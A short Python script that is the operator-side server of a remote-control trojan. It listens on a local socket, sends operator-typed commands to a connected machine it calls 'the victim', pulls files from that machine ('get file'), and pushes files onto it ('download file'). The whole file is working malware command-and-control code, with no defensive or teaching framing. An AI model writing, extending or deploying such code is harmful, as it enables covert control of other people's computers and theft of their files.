import socket


def server():
    s = socket.socket()
    s.bind(('127.0.0.1', 9984))

    s.listen(1)
    client_socket, adress = s.accept()
    print("Connection from: " + str(adress))

    while True:
        command = input('Please enter a command to the victim\n')
        client_socket.send(command.encode('utf-8'))
        if 'get file ' in command:
            data = None
            file_path = input("Please enter the path of the file\n")
            with open(file_path, 'wb')as f:
                print('Open File')
                while True:
                    data = client_socket.recv(1024)
                    if not data or len(data) < 1024:
                        f.write(data)
                        f.flush()
                        f.close()
                        break
                    f.write(data)
        elif 'download file ' in command:
            command = command.replace('download file ', '')
            print('hey')
            f = open(command, 'rb')
            while True:
                content = f.read(1024)
                if content:
                    client_socket.sendall(content)
                else:
                    f.close()
                    break




        else:
            data = client_socket.recv(1024).decode('utf-8')
            print(data)

    client_socket.close()


if __name__ == '__main__':
    server()
